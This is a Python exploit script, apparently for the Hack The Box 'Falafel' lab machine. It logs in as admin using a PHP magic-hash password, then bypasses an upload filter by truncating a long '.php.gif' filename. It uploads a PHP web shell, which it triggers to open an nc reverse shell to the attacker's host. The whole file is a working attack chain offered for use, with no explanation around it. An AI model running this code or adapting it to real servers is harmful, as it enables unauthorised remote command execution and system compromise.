# Falafel HTB (Upload Shell)
import requests, argparse, http.server, socketserver, threading
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser()
parser.add_argument("--target", "-t", dest="target", help="Machine Target", required=True)
parser.add_argument("--myip", "-ip", dest="myip", help="Local IP", required=True)
parser.add_argument("--port", "-p", dest="port", help="Port for netcat", required=True)
args = parser.parse_args()

target = args.target
myip = args.myip
port = args.port

upload_url = f"http://{target}/upload.php"
login_url = f"http://{target}/login.php"
filename = "A" * 232 + ".php.gif"
s = requests.Session()
http_proxy = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def start_http_server():
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", 8000), Handler) as httpd:
        print("Serving at port 8000")
        httpd.serve_forever()

def create_shell(ip, port, filename):
    payload = f"<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f');?>"
    with open(filename, 'w') as fn:
        fn.write(payload)

def login():
    data = "username=admin&password=240610708"
    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post(login_url, data=data, headers=header)
    if 'Login Successful' in r.text:
        print("[+] Success Login")
    else:
        print("[-] Failed, check the credential")

def upload_shell(url_shell, target):
    data = "url=" + url_shell
    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post(upload_url, data=data, headers=header, proxies=http_proxy)
    if "Upload Succsesful" in r.text:
        print("\n[+] Shell uploaded")
        soup = BeautifulSoup(r.text, 'html.parser')
        pre_path = soup.find('pre')
        if pre_path:
            cmd_text = pre_path.get_text(strip=True)
            path_start = cmd_text.find('/uploads')
            path_end = cmd_text.find(';')
            path = cmd_text[path_start:path_end].strip()
            shell_path = filename.replace('.gif', '')
            target = target[:-1] if target.endswith('/') else target
            target = f"http://{target}{path}/{shell_path}"
            print(f"Path: {target}")
    return target

def run_shell(target):
    print("\n[+] Check your nc!")
    requests.get(target)

def main():
    print(f"[!] Please turn on nc first with listening to {port}")
    thread_server = threading.Thread(target=start_http_server)
    thread_server.start()
    create_shell(myip, port, filename)
    login()
    url_shell = f"http://{myip}:8000/{filename}"
    shell_target = upload_shell(url_shell, target)
    run_shell(shell_target)

if __name__ == "__main__":
    main()
